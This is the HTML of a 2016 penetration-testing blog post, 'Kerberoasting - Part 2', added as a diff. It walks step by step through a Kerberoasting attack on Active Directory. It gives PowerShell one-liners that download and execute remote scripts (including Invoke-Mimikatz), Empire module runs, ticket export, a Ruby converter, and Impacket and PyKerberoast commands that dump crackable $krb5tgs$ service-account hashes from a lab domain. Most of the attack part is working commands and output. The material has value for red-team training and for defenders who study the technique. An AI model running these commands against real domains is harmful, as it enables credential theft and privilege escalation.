@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>Kerberoasting - Part 2 &middot; Rob &#39;mubix&#39; Fuller</title>
+        <meta name="description" content="Previous works: There has been a number of different blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&rsquo;ll will be sure to reference it.">
+        <meta name="HandheldFriendly" content="True">
+        <meta name="MobileOptimized" content="320">
+        <meta name="generator" content="Hugo 0.17" />
+        <meta name="robots" content="index,follow">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        <link rel="stylesheet" href="https://room362.com/css/normalize.css">
+        <link rel="stylesheet" href="https://room362.com/css/highlight.css">
+        <link rel="stylesheet" href="https://room362.com/css/style.css">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300&subset=latin,cyrillic-ext,latin-ext,cyrillic">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    </head>
+    <body>
+        
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-198967-1', 'auto');
+ga('send', 'pageview');
+</script>
+
+
+        <div id="wrapper">
+            <header class="site-header">
+                <div class="container">
+                    <div class="site-title-wrapper">
+                        
+                            <h1 class="site-title">
+                                <a title="Room362" href="https://room362.com/">Room362</a>
+                            </h1>
+                        
+                        <a class="button-square" href="https://room362.com/index.xml"><i class="fa fa-rss"></i></a>
+                        
+                            <a class="button-square button-social hint--top" data-hint="Twitter" title="Twitter" href="https://twitter.com/mubix">
+                                <i class="fa fa-twitter"></i>
+                            </a>
+                        
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Github" title="Github" href="https://github.com/mubix">
+                                <i class="fa fa-github-alt"></i>
+                            </a>
+                        
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="LinkedIn" title="LinkedIn" href="https://linkedin.com/in/mubix">
+                                <i class="fa fa-linkedin"></i>
+                            </a>
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Google+" title="Google+" href="https://google.com/&#43;mubix">
+                                <i class="fa fa-google-plus"></i>
+                            </a>
+                        
+                    </div>
+
+                    <ul class="site-nav">
+                        
+    <li class="site-nav-item">
+        <a title="Brandon" href="/brandon/">Brandon</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a title="About" href="/about/">About</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a title="Start in Infosec" href="/start/">Start in Infosec</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a title="Projects" href="/projects/">Projects</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a title="PwnWiki" href="http://pwnwiki.io">PwnWiki</a>
+    </li>
+
+                    </ul>
+                </div>
+            </header>
+
+            <div id="container">
+
+
+<div class="container">
+    <article class="post-container" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">Kerberoasting - Part 2</h1>
+    
+    <p class="post-date">
+        <span>Published <time datetime="2016-05-21" itemprop="datePublished">Sat, May 21, 2016</time></span>
+        <span>by</span>
+        <span itemscope="" itemprop="author" itemtype="https://schema.org/Person">
+            <span itemprop="name">
+                <a href="https://twitter.com/mubix" itemprop="url" rel="author">Rob &#39;mubix&#39; Fuller</a>
+            </span>
+        </span>
+    </p>
+</header>
+
+        <div class="post-content clearfix" itemprop="articleBody">
+    
+
+    
+
+<p><strong>Previous works:</strong> There has been a number of different blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&rsquo;ll will be sure to reference it.</p>
+
+<p><strong>Attacker KB Link:</strong> (to be updated later)</p>
+
+<p><strong>Common Findings DB Link:</strong> (to be updated later)</p>
+
+<p>Now that we&rsquo;ve listed all the tickets in a ton of different ways, we need to request the ones we want and get them to a point that we can start cracking them.</p>
+
+<h2 id="requesting-spn-kerberos-tickets">Requesting SPN Kerberos Tickets</h2>
+
+<h3 id="powershell-requesting">PowerShell Requesting</h3>
+
+<p>These are stolen directly from <a href="https://twitter.com/timmedin">Tim Medin @timmedin</a>&rsquo;s <a href="https://github.com/nidem/kerberoast/blob/master/README.md">Kerberoast repository README.md</a></p>
+
+<p><strong>One specific ticket:</strong></p>
+
+<p>This is great if you are targeting one specific user account:</p>
+
+<pre><code>PS C:\&gt; Add-Type -AssemblyName System.IdentityModel  
+PS C:\&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;HTTP/web01.medin.local&quot;  
+</code></pre>
+
+<p><strong>All the tickets (including Computer account tickets):</strong></p>
+
+<p>I&rsquo;m not a huge fan of this method since you get too many tickets to deal with but it&rsquo;s a great example of how to use PowerShell to parse and request things like this:</p>
+
+<pre><code>PS C:\&gt; Add-Type -AssemblyName System.IdentityModel  
+PS C:\&gt; setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
+</code></pre>
+
+<h3 id="powershell-requesting-just-users">PowerShell Requesting - Just Users</h3>
+
+<p><strong>Getting just the User tickets:</strong></p>
+
+<p>This is a slightly modified version of Tim&rsquo;s script from above. It pulls down his GetUserSPNs powershell script instead of using <code>SetSPN.exe</code> and makes a request for each of the resulting SPN tickets.</p>
+
+<pre><code>PS C:\&gt; Add-Type -AssemblyName System.IdentityModel
+PS C:\&gt; IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1&quot;) | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}}
+</code></pre>
+
+<h3 id="empire">Empire</h3>
+
+<p>PowerShell Empire received the functionality to get the SPN Tickets via <a href="https://twitter.com/harmj0y">@harmj0y</a>&rsquo;s commit here: <a href="https://github.com/PowerShellEmpire/Empire/commit/b977dec1ae71753b6b896497be222abc6a124639">b977dec</a> which as of the writing of this post was still in the <code>dev</code> branch of Empire (not master yet)</p>
+
+<pre><code>(Empire: BDW3E2G2ZRKCUS3B) &gt; usemodule credentials/get_spn_tickets
+(Empire: credentials/get_spn_tickets) &gt; info
+
+           Name: Get-SPNTickets
+         Module: credentials/get_spn_tickets
+     NeedsAdmin: False
+      OpsecSafe: True
+   MinPSVersion: 2
+     Background: True
+OutputExtension: None
+
+Authors:
+  @harmj0y
+
+Description:
+  Requests kerberos tickets for all users with a non-null
+  service principal name (SPN). These tickets can be extracted
+  with credentials/mimikatz/extract_tickets.
+
+Options:
+
+  Name  Required    Value                     Description
+  ----  --------    -------                   -----------
+  Agent True        BDW3E2G2ZRKCUS3B          Agent to run module on.
+
+(Empire: credentials/get_spn_tickets) &gt; run
+Job started: Debug32_a7og3
+
+
+
+Id                   : uuid-7856e72a-2c40-4d94-a939-8c671b80e2bd-1
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKe
+                       y}
+ValidFrom            : 5/19/2016 3:06:41 PM
+ValidTo              : 5/19/2016 3:08:41 PM
+ServicePrincipalName : kadmin/changepw
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+Id                   : uuid-7856e72a-2c40-4d94-a939-8c671b80e2bd-2
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKe
+                       y}
+ValidFrom            : 5/19/2016 3:06:41 PM
+ValidTo              : 5/20/2016 12:53:24 AM
+ServicePrincipalName : http/win10.sittingduck.info
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+Id                   : uuid-7856e72a-2c40-4d94-a939-8c671b80e2bd-3
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKe
+                       y}
+ValidFrom            : 5/19/2016 3:06:41 PM
+ValidTo              : 5/20/2016 12:53:24 AM
+ServicePrincipalName : MSSQLSvc/WIN2K8R2.sittingduck.info
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+Get-SPNTickets completed!
+</code></pre>
+
+<h2 id="exporting-the-tickets">Exporting the tickets</h2>
+
+<p>Now we need to get the tickets out of the system we just requested them to. We can do this with Mimikatz both by itself, or directly in Empire:</p>
+
+<h3 id="mimikatz">Mimikatz</h3>
+
+<p>Using the <strong><code>kerberos::list /export</code></strong> functionality is awesome, but this will generate a file per-ticket. I have been on a few engagements where that meant 4000+ files. Luckily the awesome <a href="https://twitter.com/gentilkiwi">@gentilkiwi</a> saves us and has included a &ldquo;base64&rdquo; mode for Mimikatz</p>
+
+<p>So here I&rsquo;m simply pulling the <code>Invoke-Mimikatz</code> script that <a href="https://twitter.com/JosephBialek">@JosephBialek</a> &ldquo;clymb3r&rdquo; created, into memory, telling Mimikatz to go in &ldquo;base64&rdquo; mode, export all of the active tickets and exit.</p>
+
+<pre><code>PS C:\&gt; IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&quot;)
+PS C:\&gt; Invoke-Mimikatz -Command 'standard::base64 &quot;kerberos::list /export&quot; exit'
+</code></pre>
+
+<h3 id="empire-1">Empire</h3>
+
+<p>Here is the module:</p>
+
+<pre><code>(Empire: agents) &gt; usemodule credentials/mimikatz/extract_tickets
+(Empire: credentials/mimikatz/extract_tickets) &gt; info
+
+           Name: Invoke-Mimikatz extract kerberos tickets.
+         Module: credentials/mimikatz/extract_tickets
+     NeedsAdmin: False
+      OpsecSafe: True
+   MinPSVersion: 2
+     Background: True
+OutputExtension: None
+
+Authors:
+  @JosephBialek
+  @gentilkiwi
+
+Description:
+  Runs PowerSploit's Invoke-Mimikatz function to extract
+  kerberos tickets from memory in base64-encoded form.
+
+Options:
+
+  Name  Required    Value                     Description
+  ----  --------    -------                   -----------
+  Agent True        None                      Agent to run module on.
+</code></pre>
+
+<p>And the result&hellip;</p>
+
+<pre><code>Job started: Debug32_segox
+Hostname: win7.sittingduck.info / S-1-5-21-4217918325-2978756054-1117708521
+  .#####.   mimikatz 2.1 (x64) built on Mar 31 2016 16:45:32
+ .## ^ ##.  &quot;A La Vie, A L'Amour&quot;
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
+  '#####'                                     with 18 modules * * */
+
+mimikatz(powershell) # standard::base64
+isBase64Intercept was    : false
+isBase64Intercept is now : true
+
+mimikatz(powershell) # kerberos::list /export
+
+[00000000] - 0x00000012 - aes256_hmac
+   Start/End/MaxRenew: 5/19/2016 10:53:27 AM ; 5/19/2016 8:53:24 PM ; 5/26/2016 10:53:24 AM
+   Server Name       : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO
+   Client Name       : notanadmin @ SITTINGDUCK.INFO
+   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
+====================
+Base64 of file : 0-60a10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
+====================
+doIFTjCCBUqgAwIBBaEDAgEWooIEVTCCBFFhggRNMIIESaADAgEFoRIbEFNJVFRJ
+TkdEVUNLLklORk+iJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEFNJVFRJTkdEVUNLLklO
+Rk+jggQFMIIEAaADAgESoQMCAQKiggPzBIID755axXlzQ6q8s93GffDw/YjUwy+U
+KYB3hUdJijD2VtVPfHGnADl/pT2+Xuhu4uMOiVhsjUR/bfhIn8G1MkHPh3d3EtWx
+oOvwZt8IsSE4pStAqrDCXAD9HbIi8G4QJ3dxMV875ThyihQKvp8ngHYRl8UfPXD+
+YwuJhTm8OqDWiK2EgRDYX9VdtWktJp5FoVRBB4T0MAhMKqEZD5XNpNE6VGNBjJTQ
+Fq9/82rfL0m4DkLXOnWxLy6iEL9mPg/etC4P8LQWu/UFbNf4enwSL93sgdq6XV6z
+kAc+dv/0gTkoHO+ci4ivQilomtAYtDLU7LLE1nOBC+9gllB8rrnP6WOgIBzqC91K
+WLk8cqsjjdacSLcqGJ38rFQQUhVmWcHRqzzn7iiCuTsRulsUZ5EF3kduOVPVzrcy
+GA8yMDE2MDUxOTE1MzYwN1qmERgPMjAxNjA1MjAwMDUzMjRapxEYDzIwMTYwNTI2
+MTQ1MzI0WqgSGxBTSVRUSU5HRFVDSy5JTkZPqSUwI6ADAgECoRwwGhsGa3JidGd0
+GxBTSVRUSU5HRFVDSy5JTkZP
+====================
+
+   * Saved to file     : 0-60a10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
+</code></pre>
+
+<p>I&rsquo;ve cut the result down quite a bit as it would scroll for a bit in this format.</p>
+
+<p>Now the problem is that they are all text and for you to crack things or at least convert them into a format that JtR or oclHastcat can digest they need to be in binary format. So I made this script to convert and <code>agent.log</code> file from the output of <strong><code>extract_tickets</code></strong> back into their binary format with correct file names. My coding isn&rsquo;t great, so please let me know how I can improve this script:</p>
+
+<pre><code class="language-ruby">#!/usr/bin/env ruby
+require 'base64'
+
+puts ARGV.inspect
+
+if ARGV.length != 1
+	puts &quot;Requires a file to parse, usually agent.log&quot;
+	exit
+end
+
+border = &quot;====================&quot;
+bordercount = 0
+ticket = []
+filename = &quot;failed.log&quot;
+
+File.open(ARGV[0]).each do |line|
+	if line.strip == border
+		case bordercount
+		when 2
+			File.open(filename, 'a') {|f| f.write(Base64.decode64(ticket.join))}
+			bordercount = 0
+			ticket = []
+			filename = &quot;failed.log&quot;
+		else
+			bordercount = bordercount + 1
+		end
+	else
+		case bordercount
+		when 1
+			filename = line.strip.split(&quot; : &quot;)[1]
+			puts &quot;Storing #{filename}&quot;
+		when 2
+			ticket &lt;&lt; line.strip
+		end
+	end
+end
+</code></pre>
+
+<p>Save that and just feed it an <code>agent.log</code> file from Empire and WA-LA! you have kirbi files.</p>
+
+<pre><code>ruby parse.rb agent.log
+[&quot;agent.log&quot;]
+Storing 0-60a10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
+Storing 1-40e10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
+Storing 2-40a10000-notanadmin@MSSQLSvc~WIN2K8R2.sittingduck.info-SITTINGDUCK.INFO.kirbi
+Storing 3-40a10000-notanadmin@http~win10.sittingduck.info-SITTINGDUCK.INFO.kirbi
+Storing 4-40a10000-notanadmin@kadmin~changepw-SITTINGDUCK.INFO.kirbi
+Storing 5-40a50000-notanadmin@ProtectedStorage~DC1.sittingduck.info-SITTINGDUCK.INFO.kirbi
+Storing 6-40a50000-notanadmin@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi
+Storing 7-40a50000-notanadmin@cifs~win2k8r2.sittingduck.info-SITTINGDUCK.INFO.kirbi
+Storing 8-40a50000-notanadmin@ldap~win2k8r2.sittingduck.info~sittingduck.info-SITTINGDUCK.INFO.kirbi
+Storing 9-40a50000-notanadmin@ldap~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi
+Storing 10-40a50000-notanadmin@LDAP~DC1.sittingduck.info~sittingduck.info-SITTINGDUCK.INFO.kirbi
+</code></pre>
+
+<p>Next we need to convert those binary tickets into something crackable. That is where <strong><code>kirbi2john.py</code></strong> comes in.</p>
+
+<h3 id="kirbi2john">Kirbi2John</h3>
+
+<p>There are two versions of &ldquo;kirbi2john&rdquo;.</p>
+
+<ul>
+<li><a href="https://github.com/nidem/kerberoast/blob/master/kirbi2john.py">Kerberoast version of kirbi2john.py by Michael Kramer (SySS GmbH)</a></li>
+<li><a href="https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/kirbi2john.py">John the Ripper&rsquo;s version of kirbi2john.py by Michael Kramer - modded by Dhiru Kholia</a></li>
+</ul>
+
+<pre><code>root@wpad:~/johntheripper/run# ./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi
+$krb5tgs$unkown:9e5ac5797343aabcb3ddc67df0f0fd88$d4c32f942980778547498a30f656d54f7c71a700397fa53dbe5ee86ee2e30e89586c8d447f6df8489fc1b53241cf87777712d5b1a0ebf066df08b12138a52b40aab0c25c00fd1db222f06e10277771315f3be538728a140abe9f2780761197c51f3d70fe630b898539bc3aa0d688ad848110d85fd55db5692d269e45a154410784f430084c2aa1190f95cda4d13a5463418c94d016af7ff36adf2f49b80e42d73a75b12f2ea210bf663e0fdeb42e0ff0b416bbf5056cd7f87a7c122fddec81daba5d5eb390073e76fff48139281cef9c8b88af4229689ad018b432d4ecb2c4d673810bef6096507caeb9cfe963a0201cea0bdd4a58b93c72ab238dd69c48b72a189dfcac541052156659c1d1ab3ce7ee2882b93b11ba5b14679105de476e3953d5ceb7328a5d221cfd323b7deb8234be1bf0d4b8c9f02463ad6da667323478f7acba2424e4311c837db608fc27b25a24d6c1315d7927d165a0859460ed65aaabaffd488b23dfcb01c8866aad556831370e89c25a6d8843aae676186f927eadf86f187d355f4a1d97472a44dc32fc52c4b6c40f42bb84f8589ee607eff2fd511bb6eaae90640a6dd2b3557ae5ae992d025aa13c25fafe9bd5b93aa36834a715c5dcde96bda38b880797852d2cff13324a1751a9b198b60ebf81c96b8dc5edf1474fe1fa53628f3aa53416e4062c503f1efb22a8ce11ab7ba8c40bc30c816568091ad051c55b3c8780964c87b5db241224bd3280eecb7e73f2921c770ccf41fbea8e43b2a1be0c6178c799fdbe8d1fffdd4a37a2aeeebb27a4f09f669203969b80e1ab7d6e28cae00af7fd3a6c731448c97356759ecc3eefec7f6ef155bd63b84bb25b1b66f8f1908ece15dbba12219c80b6797e04315889790f9c06c611314f8cd
+</code></pre>
+
+<p>But all of that is hard and creates evidence. Lets look back at the tools <a href="https://github.com/skelsec/PyKerberoast">PyKerberoast</a> and <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py">Impacket&rsquo;s GetUserSPNs.py</a> and see if there is a better way:</p>
+
+<h2 id="pykerberoast">PyKerberoast</h2>
+
+<ul>
+<li>Source: <a href="https://github.com/skelsec/PyKerberoast">https://github.com/skelsec/PyKerberoast</a></li>
+<li>Requirements: <code>python-ldap</code></li>
+</ul>
+
+<p>This awesome work by <a href="https://twitter.com/skelsec">@skelsec</a> makes it so no new Kerberos tickets need to be added to the client, no use of Mimikatz, and no need to parse anything, it just contacts the Domain Controller. It pulls out all of the information needed for the SPNs, requests the tickets and outputs them in John the Ripper format.</p>
+
+<p>Usage:</p>
+
+<pre><code>kerberoastv2.py [-h] -a ADSERVER -b LDAPBASE -d DOMAIN -u USERNAME
+                [-p PASSWORD] [-o OUTPUTFILE] [-em ENUMMACHINE] [-v]
+</code></pre>
+
+<p>Example (I have snipped up some of the output to save space):</p>
+
+<pre><code>root@wpad:~/pykerberoast# python kerberoastv2.py -a 192.168.168.10 -b &quot;dc=sittingduck,dc=info&quot; -d sittingduck -u notanadmin
+[+]Starting...
+Password:
+$krb5tgs$23$*uberuser$SITTINGDUCK.INFO$spn*$4da625ffd63dad7676effe133dcb9c1b$af52b31c7c39808f02bceb2d728550e375ff7321f7383f4800445df2a27006950a0f88c69a447de1643a7418f056315c684382068701a62f627c6cafde81bbc657c865ddd828027cef1edc11228ea0b95caca91647fc4b581efb380e466d12e253309d65a11dcbe02b0de70e0aa9044350461ad5d4293a07e3cf588a05a04a7942b63f395c6eed5e8dc826160a7bc00e295df539e419b9a4c17762b3bc987bc339354892e51090d7a7ede236cf500438e57f47a4155cc38f8a07cfdb2e3f7033ce412a6f7856911d9cf95e659daf4269d1b31cf872b09dc86af614b95c457fc896d01fdfb0afc751d2279d4c715
+
+[+]Done!
+</code></pre>
+
+<h2 id="impacket">Impacket</h2>
+
+<ul>
+<li>Original Discussion: <a href="https://github.com/CoreSecurity/impacket/pull/153#issuecomment-218438868">https://github.com/CoreSecurity/impacket/pull/153#issuecomment-218438868</a></li>
+<li>Added May 13 2016: <a href="https://github.com/CoreSecurity/impacket/commit/2a185c1ecc0b0a56467f12dfccbd5672ed95adaa">https://github.com/CoreSecurity/impacket/commit/2a185c1ecc0b0a56467f12dfccbd5672ed95adaa</a></li>
+<li>Source: <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py">https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py</a></li>
+</ul>
+
+<p>Just by adding a <strong><code>-request</code></strong> to our previous run we can request all of the user SPN tickets and they are output in John the Ripper format (I&rsquo;ve snipped up some of the output to save space):</p>
+
+<pre><code>root@wpad:~/impacket/examples# ./GetUserSPNs.py -request sittingduck.info/notanadmin
+Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies
+
+Password:
+ServicePrincipalName                Name        MemberOf                                              PasswordLastSet
+----------------------------------  ----------  ----------------------------------------------------  -------------------
+http/win10.sittingduck.info         uberuser    CN=Enterprise Admins,CN=Users,DC=sittingduck,DC=info  2015-11-10 23:47:21
+MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                                        2016-05-13 19:13:20
+
+$krb5tgs$23$*sqladmin01$SITTINGDUCK.INFO$SPN*$6e5307df490c6e3339f613fdc5655785$80ba233b4d24531202f2e354c99e7eda807bde7aeeb48ee4cdb6bf809d78652413699e3cff8b9b78b9ee70e997a538155fc7f72e208d715020d458b8413d4b12b212738833c4694d84937d65cb8ecd0020c00a5d39c07da35a748ea2cb062fca4fa9b282e7046d70ee1cae4cfee7d6f791052e283
+$krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310b787ec5c10b20fcc0acb1406b6a6e2ffddd71de3dc4c70c19e5dfcf262cc88574e61cb3940ebfd574b2bb555f2b05f84d8526e3cf46fc0ca57e03467729757cbf79da9f55cde9dabdda68e80dce6564e9f1b904b0585dbc813b82abf89e973e41c102b664f4c649f85acaf7904a273dddcb9315a66f27334f313190e1caf4f5055b671d250f5912cc1871a1dd4a6126087ddfb98ade8f7dde495ee8ad76583aa5a12eef63a690dd82a15eaaca0d7594f2f1dbc899035d89dd628b291590058cfb3405d1dfe4a383be5704465d9c8972ef8f1cba3541fdfa7dcf5063eaed74051fa18bd73f7b4f7d77
+</code></pre>
+
+<p>Much easier ;-) oh, and did I mention that if you use Impacket&rsquo;s version you can just use LM/NTLM hashes instead of a password? Awesome! Alright, all we have left is to crack these tickets and figure out how to use them&hellip;</p>
+
+<h1 id="references">References:</h1>
+
+<h2 id="tools">Tools</h2>
+
+<ul>
+<li><a href="https://github.com/nidem/kerberoast">Kerberoast</a></li>
+<li><a href="https://github.com/coresecurity/impacket">Impacket</a></li>
+<li><a href="https://github.com/skelsec/PyKerberoast">PyKerberoast</a></li>
+<li><a href="https://github.com/magnumripper/JohnTheRipper">Github - John the Ripper - Magnumripper</a></li>
+<li><a href="https://github.com/hashcat/oclHashcat">Github - oclHashcat</a></li>
+</ul>
+
+<h2 id="presentations">Presentations</h2>
+
+<ul>
+<li>Tim Medin&rsquo;s Slides - [Kicking the Guard Dog of Hades - slides](<a href="https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf">https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf</a>)</li>
+<li>Tim Medin&rsquo;s Video - <a href="https://www.youtube.com/watch?v=PUyhlN-E5MU&amp;feature=youtu.be">Kicking the Guard Dog of Hades - video</a></li>
+</ul>
+
+<h2 id="other-write-ups">Other write ups</h2>
+
+<ul>
+<li><a href="http://malwarejake.blogspot.com/2015/11/kerberos-silver-tickets-unique-attacker.html">Jacob Williams (MalwareJake) post about Silver Tickets being using in the wild</a></li>
+<li><a href="https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Brute-Forcing_Service_Account_Passwords.html">Ben Lincoln&rsquo;s writeup on Brute Forcing Service Account Passwords</a></li>
+<li><a href="https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/">Leon Jacob&rsquo;s writeup on Kerberoast</a></li>
+<li><a href="https://adsecurity.org/?p=2293">Sean Metcalf&rsquo;s writeup on Kerberoast</a></li>
+<li><a href="https://adsecurity.org/?page_id=183">Sean Metcalf&rsquo;s SPN directory</a></li>
+</ul>
+
+</div>
+
+        <footer class="post-footer clearfix">
+    
+        <p class="post-tags">
+            <span>Tagged:</span>
+            
+                 <a href="/tags/kerberos/">kerberos</a>
+            
+                 <a href="/tags/impacket/">impacket</a>
+            
+                 <a href="/tags/empire/">empire</a>
+            
+                 <a href="/tags/powershell/">powershell</a>
+            
+                 <a href="/tags/spn/">spn</a>
+            
+                 <a href="/tags/mimikatz/">mimikatz</a>
+            
+        </p>
+    
+
+    <div class="share">
+        <a class="icon-twitter" href="https://twitter.com/share?text=Kerberoasting%20-%20Part%202&url=https%3a%2f%2froom362.com%2fpost%2f2016%2fkerberoast-pt2%2f"
+            onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+            <i class="fa fa-twitter"></i>
+            <span class="hidden">Twitter</span>
+        </a>
+
+        <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2froom362.com%2fpost%2f2016%2fkerberoast-pt2%2f"
+            onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+            <i class="fa fa-facebook"></i>
+            <span class="hidden">Facebook</span>
+        </a>
+
+        <a class="icon-google-plus" href="https://plus.google.com/share?url=https%3a%2f%2froom362.com%2fpost%2f2016%2fkerberoast-pt2%2f"
+           onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+           <i class="fa fa-google-plus"></i>
+            <span class="hidden">Google+</span>
+        </a>
+    </div>
+</footer>
+
+        
+    </article>
+</div>
+
+            </div>
+        </div>
+
+        <footer class="footer">
+            <div class="container">
+                <div class="site-title-wrapper">
+                    <h1 class="site-title">
+                        <a title="Room362" href="https://room362.com/">Room362</a>
+                    </h1>
+                    <a class="button-square button-jump-top js-jump-top" href="#">
+                        <i class="fa fa-angle-up"></i>
+                    </a>
+                </div>
+
+                <p class="footer-copyright">
+                    <span>&copy; 2016 / Powered by <a href="https://gohugo.io/">Hugo</a></span>
+                </p>
+                <p class="footer-copyright">
+                    <span><a href="https://github.com/roryg/ghostwriter">Ghostwriter theme</a> By <a href="http://jollygoodthemes.com">JollyGoodThemes</a></span>
+                    <span>/ <a href="https://github.com/jbub/ghostwriter">Ported</a> to Hugo By <a href="https://github.com/jbub">jbub</a></span>
+                </p>
+            </div>
+        </footer>
+
+        <script src="https://room362.com/js/jquery-1.11.3.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js"></script>
+        <script src="https://room362.com/js/jquery.fitvids.js"></script>
+        <script src="https://room362.com/js/scripts.js"></script>
+    </body>
+</html>
+
